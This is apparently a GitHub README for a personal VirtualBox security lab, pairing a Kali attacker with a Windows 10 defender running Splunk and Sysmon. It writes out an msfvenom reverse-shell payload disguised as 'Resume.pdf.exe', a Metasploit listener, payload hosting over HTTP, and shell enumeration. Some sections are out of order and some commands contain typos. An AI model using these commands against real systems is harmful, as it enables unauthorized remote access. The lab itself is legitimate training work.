<h1 = align=center>Virtual Home Lab</h1>
<h2 = align=center>Attack and Defense</h2>

<p align="center">
<img width="956" height="522" alt="Untitled Diagram drawio (7) drawio" src="https://github.com/user-attachments/assets/d4a4ad35-5a28-4c3e-bf07-cde76d12213b" />
</p>

<p align="center">
  <strong>Attacker:</strong> Kali Linux <code>192.168.20.20</code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  <strong>Defender:</strong> Windows 10 <code>192.168.20.10</code>
</p>

---

## 🛠️ Technology & Tools Utilized

- **`VirtualBox:`**  
  Served as the primary hypervisor for hosting virtual machines locally in a controlled lab environment.

- **`Windows Server:`**  
  Deployed as the core infrastructure server for testing services such as Splunk, Active Directory, DNS, or file sharing.

- **`Kali Linux:`**  
  Used as the attacker machine for penetration testing, vulnerability scanning, and offensive security simulations.

- **`Bash:`**  
  Used as the primary command-line shell within Kali Linux to execute scripts, automate tasks, manage tools, and perform offensive security operations.

- **`Splunk:`**  
  Deployed to monitor system and network activity in real time. Ingested logs from the Windows VM to analyze attack patterns, identify anomalies, and simulate Security Operations Center (SOC) workflows.

- **`Sysmon:`**  
  Installed on the Windows VM to generate detailed event logs for process creation, file changes, network connections, and other system activities. Used in conjunction with Splunk to detect indicators of compromise (IOCs) and understand attacker behavior.

<p align="center">
  <img width="300" height="300" alt="sysmon-splunk" src="https://github.com/user-attachments/assets/8b0877ff-cabe-4bb0-90b7-0541f67cc0cd" />
</p>

---

## Objective

In this lab environment, I am building on foundational virtualization skills by deploying a security-focused network simulation using VirtualBox. The setup includes a Windows virtual machine configured as the defender system, equipped with Splunk Enterprise for log aggregation and analysis, and Sysmon for detailed event logging. Opposing it is a Kali Linux virtual machine, which serves as the attacker platform to simulate real-world threats and offensive security techniques. This lab is designed to strengthen my skills in threat detection, log analysis, and incident response by observing and analyzing malicious activity in a controlled environment.

## Preparation

Before conducting the test, the `Windows 10` virtual machine was preconfigured with `Splunk Enterprise` and `Sysmon` installed, along with the `Sysmon Add-on` for Splunk to enable proper event parsing and visualization. Both the Windows and Kali Linux virtual machines were connected to an `internal network` to isolate the environment. For the purpose of the test, `Windows Defender`, `Microsoft Security` features, and the system `firewall` were temporarily disabled to allow full visibility into attack behavior and network activity.

---

## 👣 Steps the `Attacker` Made

### Step 1: Aggressive Network Reconnaissance

The attacker used the command `nmap -A -Pn 192.168.20.10` to perform an `aggressive scan` against the host at IP address `192.168.20.10`.

```bash
nmap -A -Pn 192.168.20.10
```
<img width="626" height="248" alt="Lab 203" src="https://github.com/user-attachments/assets/49ff2b97-51ae-4a25-a16c-247070356a3a" /></br>

Based on these results, the attacker identifies that several critical ports are open on the target system, including `135/tcp (RPC)`, `139/tcp (NetBIOS Session Service)`, `445/tcp (Microsoft-DS/SMB)`, and `3389/tcp (Remote Desktop Protocol - RDP)`. These open ports provide potential attack vectors, as they correspond to services that, if improperly secured, can be exploited for unauthorized access, information gathering, or lateral movement within the network.

---

### Step 2: Generate a Malicious Reverse TCP Payload for Remote Access

```bash
msfvenom -l payloads
```
The command `msfvenom -l payloads` lists all available payload options that can be generated using the Metasploit Framework’s msfvenom tool.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.20.20 lport=4444 -f exe -o Resume.pdf.exe
```
The attacker uses `msfvenom` to generate a 64-bit Windows executable payload (`Resume.pdf.exe`) that, when run on the target system, initiates a reverse TCP connection back to the attacker’s machine at `IP 192.168.20.20` on `port 4444`, allowing remote control via a `Meterpreter` session.

```bash
ls
```

```bash
file Resume.pdf.exe
```

The commands `ls` and `file Resume.pdf.exe` are used to verify the presence of the generated payload file and confirm its file type as a Windows executable.

<img width="603" height="317" alt="Lab 204" src="https://github.com/user-attachments/assets/28eaebe8-ff59-4c9a-80ca-9fd9815a45cf" />

---

### Step 3: Setting Up a Metasploit Listener for a Reverse TCP Shell

```bash
msfconsole
```

```bash
set payload windows/x64/meterpreter/reverse_tcp payload
```

```bash
set lhost 192.168.20.20
```

```bash
options
```

The attacker is launching the Metasploit console `msfconsole`, configuring it to use the `windows/x64/meterpreter/reverse_tcp payload`, and setting the local host `lhost` IP address to `192.168.20.20`, which prepares the listener to receive a reverse connection from the target system.

<img width="593" height="334" alt="Lab 205" src="https://github.com/user-attachments/assets/69f11c14-5674-435c-baf5-82906215863e" />

---

### Step 4: Hosting a Malicious Payload Using a Python HTTP Server

```bash
ls
```

```bash
python3 -m http.server 9999
```

The attacker lists the current directory with `ls`, then uses `python3 -m http.server 9999` to start a simple HTTP server on `port 9999`, allowing files in that directory (such as a malicious payload) to be served and downloaded by a target machine.

<img width="493" height="256" alt="Lab 79" src="https://github.com/user-attachments/assets/98f1f922-ef4b-49ef-8f23-fec7373ebfec" /></br>

<img width="316" height="209" alt="Lab 206" src="https://github.com/user-attachments/assets/aec51636-2e18-4075-b114-70bf6a838ecf" /></br>

<img width="783" height="168" alt="Lab 207" src="https://github.com/user-attachments/assets/d0256e34-a026-4331-936f-3f5358de998c" /></br>

*Note: Having `file extensions` enabled is important because it allows users to see the true format of a file, helping them identify potentially malicious files disguised with misleading names (e.g., `resume.pdf` that is actually `resume.pdf.exe`). Without extensions visible, users may unknowingly open executable files thinking they are safe documents, increasing the risk of malware execution.*

---

### Step 5: Active Network Connection

```bash
network -anob
```

The command `netstat -anob` is used on Windows to display all active network connections and listening ports `-a`, show addresses and port numbers in numerical form `-n`, include the executable (binary) responsible for each connection `-b`, and display the owning process ID `-o`.

<img width="602" height="69" alt="Lab 209" src="https://github.com/user-attachments/assets/90cdb1bb-f267-471a-a16b-2f896dc91bee" />

With the execution of the `Resume.pdf.exe` payload on the victim’s machine, the attacker can now observe that a reverse TCP connection has been successfully established. Using tools like `netstat`, the attacker confirms that their machine `192.168.20.20` is actively connected to the victim’s system `192.168.20.10` over a designated port, indicating that the Meterpreter session is live and the payload has executed as intended, granting remote access to the target.

<img width="662" height="188" alt="Lab 212" src="https://github.com/user-attachments/assets/3952f535-6f1a-4287-ad98-2b07cc678794" />

---

### Step 6: Establishing a Reverse Shell and Enumerating the Victim System

```bash
exploit
```

```bash
shell
```

```bash
netuser
```

```bash
net localgroup
```

```bash
ipconfig
```

The attacker runs the `exploit` command in Metasploit’s multi/handler module to begin listening for the reverse connection from the victim. Once the connection is established, they gain a `shell` on the victim’s machine, allowing them to run commands like `net user` (to enumerate local user accounts) and `ipconfig` (to view the victim’s network configuration), effectively confirming access and gathering initial system information.

<img width="619" height="98" alt="Lab 85" src="https://github.com/user-attachments/assets/6910c5ce-d789-4c9d-a055-72f2e0ff6cc8" />

<img width="542" height="477" alt="Lab 86" src="https://github.com/user-attachments/assets/df91683c-2ada-4fc4-aeb0-a22e175f13ed" />



---

### Step 4: Start the VM and Install Windows

<img width="1280" height="730" alt="Lab 16" src="https://github.com/user-attachments/assets/7321efa8-9505-4df5-9442-9300051ab10d" /></br>

- **Next**
- **Install Now**
- **Activate Windows:** I don't have a product key
- **Select the OS:** Windows 10 Pro
- **Applicable Notices and License Terms:** I accept the license terms → Next
- **Which Type of Installation:** Custom
- **Where to Install Windows:** Next

---

## 👣 Installing `Kali Linux` in VirtualBox

### Step 1: Download Kali Linux: `https://www.kali.org/`

<img width="1159" height="408" alt="Lab 24" src="https://github.com/user-attachments/assets/17384cef-efb3-4ae5-994a-9bd80db166e4" />

---

### Step 2: Download a Prebuilt VM for VirtualBox

<img width="881" height="526" alt="Kali" src="https://github.com/user-attachments/assets/8b58b4f3-8184-4319-83d6-aa2c90a9d9a6" /></br>
<img width="1272" height="677" alt="Lab 28" src="https://github.com/user-attachments/assets/33e49b1c-64be-4407-ac94-70bfea34b284" /></br>

*Note: Kali Linux is a 7-Zip file extension. If you do not have 7-Zip installed, you'll need to navigate to `https://7-zip.org/` and download.*

---

### Step 3: Extract Kali Linux with 7-Zip

1. In the Downloads folder, right-click `kali-linux-2025.2-virtualbox-amd64`
2. Hover over 7-Zip
3. Extract to `kali-linux...`
4. Double-click the extracted folder
5. Double-click the `kali-linux-2025.2-virtualbox-amd64.vbox` to import into VirtualBox

 <img width="641" height="230" alt="Lab 30" src="https://github.com/user-attachments/assets/8fb3ec55-15fd-4ce3-8ce9-f3512747504e" /></br>

*Note: If you can't see file extensions `.vbox`, click on view and check file name extensions.*

---

### Step 4: Start the Kali Linux VM

<img width="722" height="245" alt="Lab 31" src="https://github.com/user-attachments/assets/33d83883-343f-4f93-940a-d60d7be700ef" /></br>

*Note: The default credentials for Kali Linux are `Kali` for both username and password.*

*Optional: Change the default password in the terminal with the command `passwd`:*

<img width="348" height="212" alt="Lab 42" src="https://github.com/user-attachments/assets/98bcbd8a-19da-4bc7-a85e-35f1fbd37c01" />

---

## Properly Configure Your Virtual Machines!

- Ensure they have enough **resources**
- Install **Guest Additions**
- Take a clean **snapshot** for a baseline and before testing
- Harden or weaken **security** based on test goals
- Properly setup the **network** depending on your use case 

<img width="1062" height="416" alt="Lab 50" src="https://github.com/user-attachments/assets/11bb3364-a7e4-473f-b737-ddc3ab91b94c" />

---

## Congratulations on Creating a Virtual Home Lab!

<img width="2127" height="857" alt="Lab 48" src="https://github.com/user-attachments/assets/c9f75fc8-5d13-461b-88f9-f216f4493077" />

---

*This project was designed to simulate a controlled virtual environment for cybersecurity testing and network analysis using Windows Server and Kali Linux virtual machines. The goal was to assess system vulnerabilities, practice ethical hacking techniques, and observe system behavior under various security conditions.*

**Created By:** `Briana Willis`  
**Date:** `2025-07-11`  
**Time:** `20:15 UTC`












